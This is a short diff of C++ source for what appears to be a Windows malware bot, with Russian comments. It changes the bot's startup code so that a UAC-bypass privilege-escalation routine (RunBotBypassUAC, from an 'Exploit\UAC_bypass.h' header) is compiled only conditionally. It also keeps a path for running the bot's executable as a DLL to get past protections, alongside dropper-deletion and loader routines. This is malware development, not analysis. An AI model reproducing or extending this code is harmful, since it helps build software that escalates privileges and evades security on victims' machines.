@@ -20,7 +20,6 @@
 #include "BotDef.h"
 #include "DbgRpt.h"
 #include "Modules.h"
-#include "Exploit\\UAC_bypass.h"
 #include "Main.h"
 #include "StrConsts.h"
 
@@ -128,9 +127,13 @@ void DeleteDropper() // убиваем процесс, стираем файл
 
 bool RunLoaderRoutine()
 {
+#ifdef UAC_bypassH
 	if( !RunBotBypassUAC(0) )
 		return MegaJump( LoaderRoutine );
 	return true;
+#else
+	return MegaJump( LoaderRoutine );
+#endif
 }
 
 bool RunVideoProcess()
@@ -340,7 +343,7 @@ DWORD WINAPI RunFromDll(void*)
 int APIENTRY MyMain() 
 {
 	BOT::Initialize();   
-
+#ifdef UAC_bypassH
 	DWORD image = GetImageBase();
     PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
         ((PUCHAR)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
@@ -349,10 +352,11 @@ int APIENTRY MyMain()
 		//exe бота запущен как dll, такое может быть при обходе различных защит
 		MDBG( "Main", "Запустили как DLL" );
 		MegaJump(LoaderRoutine);
+
 		pExitProcess(UAC_BYPASS_MAGIC_RETURN_CODE);
 		return 0;
 	}
-
+#endif //UAC_bypassH
 
 	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
 	
